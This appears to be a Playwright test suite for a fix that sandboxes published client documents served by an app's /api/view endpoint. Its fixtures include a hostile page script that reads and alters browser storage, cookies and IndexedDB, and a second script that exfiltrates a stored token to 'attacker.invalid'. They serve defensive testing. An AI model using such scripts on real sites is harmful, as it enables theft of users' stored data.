// GOV-08 · aislamiento de /api/view (11/11/2026). /api/view serves a published client document as a page of the app's
// OWN origin, with inline scripts allowed. Before this cut such a document could read, change and carry away (by
// navigating to another site) everything the app keeps in that browser: the AI render code, the projects, the list of
// publications, other documents' observations, the images database. The person most exposed is the professional, who
// opens their own link («Ábrelo para comprobarlo») in the browser where RUBIK keeps everything.
// Written BEFORE the change and run against 9c00c81: tests tagged [defect] / [cambio] failed there; the rest document
// what must keep working. Real api/view.js over an in-memory Blob simulator; fictitious codes and data; no network:
// any request outside the app and the simulated store is recorded and aborted.
'use strict';
const {test,before,after}=require('node:test'),assert=require('node:assert/strict'),fs=require('node:fs/promises'),path=require('node:path'),os=require('node:os'),{createServer}=require('node:http'),{chromium}=require('playwright');
const View=require('../api/view.js'),Notes=require('../js/review-notes-core.js');
const root=path.resolve(__dirname,'..'),SHOTS=process.env.QA_SHOTS||'';
const RENDER='render-fixture-code-0123456789abcdef',PROJECT='{"name":"Proyecto ficticio de otra clienta","rooms":[]}',PHOTO='pixels-of-a-private-photo';
const env={BLOB_READ_WRITE_TOKEN:'vercel_blob_rw_Store42_secret'},HOST='store42.public.blob.vercel-storage.com';
const types={'.html':'text/html','.js':'text/javascript','.mjs':'text/javascript','.json':'application/json','.css':'text/css','.svg':'image/svg+xml','.png':'image/png','.webp':'image/webp','.glb':'model/gltf-binary'};
let server,browser,url,dir;
before(async()=>{dir=await fs.mkdtemp(path.join(os.tmpdir(),'view-iso-'));
 server=createServer(async(req,res)=>{try{const p=new URL(req.url,'http://l').pathname,f=path.resolve(root,'.'+(p==='/'?'/index.html':p));if(!f.startsWith(root+path.sep))throw 0;res.setHeader('Content-Type',types[path.extname(f)]||'application/octet-stream');res.end(await fs.readFile(f));}catch{res.writeHead(404,{'Content-Type':'text/html'});res.end('<!doctype html><title>app</title>');}});
 await new Promise(r=>server.listen(0,'127.0.0.1',r));url=`http://127.0.0.1:${server.address().port}/`;
 browser=await chromium.launch({executablePath:process.env.CHROME||undefined,args:['--no-sandbox','--enable-unsafe-swiftshader']});});
after(async()=>{await browser?.close();await new Promise(r=>server.close(r));await fs.rm(dir,{recursive:true,force:true});});
function fakeRes(){return {statusCode:0,headers:{},body:'',setHeader(k,v){this.headers[k.toLowerCase()]=v;},end(b){this.body=b;}};}
const link=name=>url+'api/view?f='+encodeURIComponent(`https://${HOST}/rubik-share/${name}`);
// The real /api/view over a simulated store; the store's own host serves the video; everything else is recorded and cut.
async function harness(context){
 const store=new Map(),external=[];
 const blobFetch=async u=>{const hit=store.get(new URL(u).pathname);return hit?{ok:true,status:200,text:async()=>hit.bytes.toString()}:{ok:false,status:404};};
 await context.route('**/*',async r=>{const u=r.request().url();
  if(u.startsWith(url+'api/view')){const o=fakeRes();await View.handler({method:'GET',url:u.slice(url.length-1)},o,{env,fetchImpl:blobFetch});return r.fulfill({status:o.statusCode,headers:o.headers,body:o.body});}
  if(u.startsWith(`https://${HOST}/`)){const hit=store.get(new URL(u).pathname);return hit?r.fulfill({status:200,contentType:hit.type,body:hit.bytes}):r.fulfill({status:404,body:''});}
  if(u.startsWith(url)||u.startsWith('blob:')||u.startsWith('data:'))return r.continue();external.push(u);return r.abort();});
 const put=(name,body,type='text/html')=>store.set('/rubik-share/'+name,{type,bytes:Buffer.isBuffer(body)?body:Buffer.from(body)});
 return {store,external,put};
}
// What RUBIK keeps in the browser of a professional who has been using it (fictitious values, real key names).
async function seed(page){
 await page.goto(url+'__app');
 await page.evaluate(async([token,project,photo])=>{
  localStorage.setItem('rubik-render-token',token);localStorage.setItem('rubik-sota-floorplan-project-v1',project);
  localStorage.setItem('rubik-share-publications-v1','[{"page":"https://store42.public.blob.vercel-storage.com/rubik-share/otra-casa.html"}]');
  localStorage.setItem('rubik-share-notes:otro-proyecto:v9','{"notes":[{"text":"Nota privada de otra clienta"}]}');
  sessionStorage.setItem('rubik-session','private-session-value');document.cookie='rubik-cookie=private-cookie-value; path=/';
  await new Promise((ok,ko)=>{const q=indexedDB.open('rubik-sota-images-v1',1);q.onupgradeneeded=()=>q.result.createObjectStore('images');q.onerror=()=>ko(q.error);
   q.onsuccess=()=>{const tx=q.result.transaction('images','readwrite');tx.objectStore('images').put(photo,'img-1');tx.oncomplete=()=>{q.result.close();ok();};tx.onerror=()=>ko(tx.error);};});
 },[RENDER,PROJECT,PHOTO]);
}
// A hostile document someone managed to publish (a leaked publishing code, or text injected into a real document).
const PROBE=app=>`<!doctype html><html><head><meta charset="utf-8"><title>Propuesta</title></head><body><pre id="out"></pre><script>(async function(){
var r={origin:self.origin},t=function(f){try{return f()}catch(e){return 'blocked:'+e.name}};
r.local=t(function(){var o={};for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);o[k]=localStorage.getItem(k)}return o});
r.session=t(function(){var o={};for(var i=0;i<sessionStorage.length;i++){var k=sessionStorage.key(i);o[k]=sessionStorage.getItem(k)}return o});
r.cookie=t(function(){return document.cookie});
r.write=t(function(){localStorage.setItem('rubik-render-token','planted-by-document');localStorage.removeItem('rubik-sota-floorplan-project-v1');return 'written'});
r.idb=await new Promise(function(ok){try{var q=indexedDB.open('rubik-sota-images-v1');q.onerror=function(){ok('blocked:'+(q.error&&q.error.name))};
 q.onsuccess=function(){try{var g=q.result.transaction('images').objectStore('images').get('img-1');g.onsuccess=function(){ok(g.result===undefined?null:g.result)};g.onerror=function(){ok('blocked:get')}}catch(e){ok('blocked:'+e.name)}}}catch(e){ok('blocked:'+e.name)}});
r.popup=t(function(){var w=window.open(${JSON.stringify(app+'__app')},'_blank');if(!w)return null;var v;try{v=w.localStorage.getItem('rubik-render-token')}catch(e){v='blocked:'+e.name}try{w.close()}catch(e){}return v});
r.connect=await fetch(${JSON.stringify(app+'index.html')}).then(function(x){return x.text()}).then(function(){return 'read'},function(e){return 'blocked:'+e.name});
document.getElementById('out').textContent=JSON.stringify(r);document.title='done'})()</script></body></html>`;
const EXFIL=`<!doctype html><html><head><meta charset="utf-8"><title>Propuesta</title></head><body><p>Propuesta</p><script>
var found='nothing';try{found=[localStorage.getItem('rubik-render-token'),localStorage.getItem('rubik-sota-floorplan-project-v1')].join('|')}catch(e){found='blocked:'+e.name}
location.href='https://attacker.invalid/c?d='+encodeURIComponent(found)</script></body></html>`;

test('[defect] a published document cannot read, change or carry away what the app keeps in this browser',{timeout:120000},async t=>{
 const context=await browser.newContext();t.after(()=>context.close());const h=await harness(context);
 const app=await context.newPage();await seed(app);
 h.put('probe-Ab12.html',PROBE(url));h.put('exfil-Cd34.html',EXFIL);
 const doc=await context.newPage(),resp=await doc.goto(link('probe-Ab12.html'));assert.equal(resp.status(),200,'the document itself still opens');
 await doc.waitForFunction(()=>document.title==='done');const r=JSON.parse(await doc.locator('#out').textContent());
 const stored=await app.evaluate(()=>[localStorage.getItem('rubik-render-token'),localStorage.getItem('rubik-sota-floorplan-project-v1')]);
 // Carrying it away by navigating to another site (CSP does not govern navigation).
 const exfil=await context.newPage();await exfil.goto(link('exfil-Cd34.html')).catch(()=>{});
 await exfil.waitForTimeout(1500);const leaks=h.external.filter(u=>u.startsWith('https://attacker.invalid/'));
 if(process.env.QA_EVIDENCE)await fs.writeFile(process.env.QA_EVIDENCE,JSON.stringify({probe:r,appStorageAfter:stored,navigations:leaks.map(decodeURIComponent)},null,1));
 const flat=JSON.stringify(r);
 for(const secret of [RENDER,'Proyecto ficticio de otra clienta','otra-casa.html','Nota privada de otra clienta','private-session-value','private-cookie-value',PHOTO])
  assert.ok(!flat.includes(secret),`the document reached «${secret}»: ${flat.slice(0,400)}`);
 assert.notEqual(r.write,'written','the document must not be able to change the app storage');
 assert.equal(r.popup,null,'the document must not open windows of the app');
 assert.match(r.connect,/^blocked:/,'the document must not read the app responses');
 // Nothing was changed in the app's storage.
 assert.deepEqual(stored,[RENDER,PROJECT]);
 // Whatever leaves by navigation holds nothing of the app.
 assert.ok(leaks.every(u=>!u.includes(encodeURIComponent(RENDER))&&!u.includes(RENDER)),'the render code left the browser: '+leaks.join(' '));
 assert.ok(leaks.every(u=>!decodeURIComponent(u).includes('Proyecto ficticio')),'project data left the browser');
});

test('[defect] the page is isolated by its response: opaque origin, sandbox with only scripts and downloads; privacy and cache headers kept',{timeout:60000},async t=>{
 const context=await browser.newContext();t.after(()=>context.close());const h=await harness(context);
 h.put('casa-Ef56.html','<!doctype html><html><head><meta charset="utf-8"><title>Propuesta</title></head><body><p id="p">Propuesta</p></body></html>');
 const page=await context.newPage(),resp=await page.goto(link('casa-Ef56.html'));const head=resp.headers(),csp=head['content-security-policy'];
 assert.equal(resp.status(),200);assert.equal(await page.locator('#p').textContent(),'Propuesta');
 const sandbox=(csp.split(';').map(s=>s.trim()).find(s=>/^sandbox(\s|$)/.test(s))||'').split(/\s+/).slice(1).sort();
 assert.deepEqual(sandbox,['allow-downloads','allow-scripts'],'sandbox directive: '+csp);
 assert.equal(await page.evaluate(()=>self.origin),'null','the document runs in an opaque origin, not the app\'s');
 // Kept from S2/B4: no cached copy, not indexed, no referrer, no sniffing, not framed, no network but the store video.
 assert.equal(head['cache-control'],'no-store');assert.equal(head['x-robots-tag'],'noindex, nofollow');assert.equal(head['referrer-policy'],'no-referrer');assert.equal(head['x-content-type-options'],'nosniff');
 for(const d of ["default-src 'none'","img-src data:",`media-src https://${HOST}`,"form-action 'none'","base-uri 'none'","frame-ancestors 'none'"])assert.ok(csp.includes(d),d);
 assert.deepEqual(h.external,[]);
});

// The real client document, built by the app (views prepared, a tour video in the store), opened through the link.
async function realDocument(t){
 const context=await browser.newContext({viewport:{width:1280,height:800},acceptDownloads:true});t.after(()=>context.close());const h=await harness(context);
 const page=await context.newPage();page.setDefaultTimeout(30000);await page.goto(url);await page.locator('#welcomeExample').click();await page.waitForFunction(()=>window.FloorPlanClientShare);
 await page.locator('#workArea-deliver').click();await page.locator('#professionalWorkspace [data-route="prepare-views"]').first().click();
 await page.waitForFunction(()=>FloorPlanProjectViews.status()!=='busy'&&FloorPlanProjectViews.current().length>0,null,{timeout:240000});
 // A short real WebM recorded in the browser stands for the tour video uploaded to the store.
 const webm=Buffer.from(await page.evaluate(async()=>{const c=document.createElement('canvas');c.width=320;c.height=180;const g=c.getContext('2d'),s=c.captureStream(15),rec=new MediaRecorder(s,{mimeType:'video/webm'}),parts=[];rec.ondataavailable=e=>parts.push(e.data);rec.start(100);
  let i=0;const id=setInterval(()=>{g.fillStyle=i++%2?'#205b60':'#b0442c';g.fillRect(0,0,320,180);},60);await new Promise(o=>setTimeout(o,900));clearInterval(id);await new Promise(o=>{rec.onstop=o;rec.stop();});
  return Array.from(new Uint8Array(await new Blob(parts,{type:'video/webm'}).arrayBuffer()));}));
 h.put('casa-Vd78.webm',webm,'video/webm');
 const out=await page.evaluate(v=>FloorPlanClientShare.build({video:v}),{url:`https://${HOST}/rubik-share/casa-Vd78.webm`,host:HOST,type:'video/webm'});
 h.put('casa-Gh90.html',out.html);
 const views=await page.evaluate(()=>FloorPlanProjectViews.current().length);
 return {context,h,page,out,views,open:async(ctx=context)=>{const c=await ctx.newPage(),errors=[];c.on('pageerror',e=>errors.push(e.message));c.on('console',m=>{if(m.type()==='error')errors.push(m.text());});const resp=await c.goto(link('casa-Gh90.html'));return {c,resp,errors};}};
}

test('the real client document keeps working when opened by its link: views, images, video, observations and the file download',{timeout:420000},async t=>{
 const {h,out,views,open}=await realDocument(t);const {c,resp,errors}=await open();
 assert.equal(resp.status(),200);await c.locator('#shareReview').waitFor();
 // Images (the plan sheet and every prepared view) decode; each view offers «Comentar esta imagen».
 const imgs=await c.locator('img').evaluateAll(async list=>Promise.all(list.map(async i=>{await i.decode().catch(()=>{});return i.naturalWidth;})));
 assert.ok(imgs.length>=1+views&&imgs.every(w=>w>0),'images: '+JSON.stringify(imgs));
 assert.equal(await c.locator('.share-comment-view').count(),views);
 // The tour video plays from the store.
 const played=await c.locator('#shareTour video').evaluate(async v=>{if(v.readyState<1)await new Promise((ok,ko)=>{v.onloadedmetadata=ok;v.onerror=()=>ko(Error('video blocked'));});return v.videoWidth;});
 assert.equal(played,320,'the tour video plays under the page policy');
 // Observations: a room, a point of the plan, an image; one removed.
 await c.locator('#shareReviewer').fill('Clienta de prueba');await c.locator('#shareAnchor').selectOption({index:1});await c.locator('#shareText').fill('Más luz aquí.');await c.locator('#shareAdd').click();
 const p=await c.evaluate(()=>{const r=document.querySelector('#sharePlanPick .preview-room[data-room]').getBoundingClientRect();return {x:r.x+r.width/2,y:r.y+r.height/2};});
 await c.mouse.click(p.x,p.y);assert.equal(await c.locator('#sharePointMark').count(),1);await c.locator('#shareText').fill('Un enchufe aquí.');await c.locator('#shareAdd').click();
 await c.locator('.share-comment-view').first().click();await c.locator('#shareText').fill('Me gusta esta vista.');await c.locator('#shareAdd').click();
 assert.equal(await c.locator('#shareNotes li').count(),3);await c.locator('#shareNotes li').nth(1).getByRole('button',{name:'Quitar'}).click();assert.equal(await c.locator('#shareNotes li').count(),2);
 // «Guardar archivo de observaciones» downloads the file the professional imports.
 const dl=c.waitForEvent('download');await c.locator('#shareSave').click();const d=await dl;assert.equal(d.suggestedFilename(),`observaciones-${out.versionCode}.json`);
 const file=path.join(dir,d.suggestedFilename());await d.saveAs(file);const saved=Notes.read(await fs.readFile(file,'utf8'));
 assert.equal(saved.reviewer,'Clienta de prueba');assert.deepEqual(saved.notes.map(n=>n.anchor.kind),['room','view']);
 assert.match(await c.locator('#shareStatus').innerText(),/Archivo guardado/);
 // In-page anchors still move within the document.
 assert.equal(await c.evaluate(()=>{location.hash='#shareReview';return location.hash;}),'#shareReview');
 if(SHOTS){await fs.mkdir(SHOTS,{recursive:true});for(const [w,hh] of [[390,844],[768,1024],[1280,800],[1440,900]]){await c.setViewportSize({width:w,height:hh});await c.locator('#shareReview').scrollIntoViewIfNeeded();await c.screenshot({path:path.join(SHOTS,`view-iso-${w}-observaciones.png`)});}}
 assert.deepEqual(errors,[]);assert.deepEqual(h.external,[]);
});

test('[cambio] observations are not kept after a reload any more (no storage in an isolated page) and the page says so',{timeout:420000},async t=>{
 const {h,open}=await realDocument(t);const {c,errors}=await open();await c.locator('#shareReview').waitFor();
 await c.locator('#shareText').fill('Nota que se pierde al recargar.');await c.locator('#shareAdd').click();assert.equal(await c.locator('#shareNotes li').count(),1);
 // Before: kept in the app's storage, readable by any other published document. Now: kept only while the page is open.
 const notice=c.locator('#shareVolatile');assert.equal(await notice.isVisible(),true,'the page warns that observations are only kept while it is open');
 assert.match(await notice.innerText(),/no se conservan[\s\S]*Guarda el archivo/);
 await c.reload();await c.locator('#shareReview').waitFor();assert.equal(await c.locator('#shareNotes li').count(),0);
 if(SHOTS){await fs.mkdir(SHOTS,{recursive:true});await notice.scrollIntoViewIfNeeded();await c.screenshot({path:path.join(SHOTS,'view-iso-1280-aviso.png')});}
 assert.deepEqual(errors,[]);assert.deepEqual(h.external,[]);
});
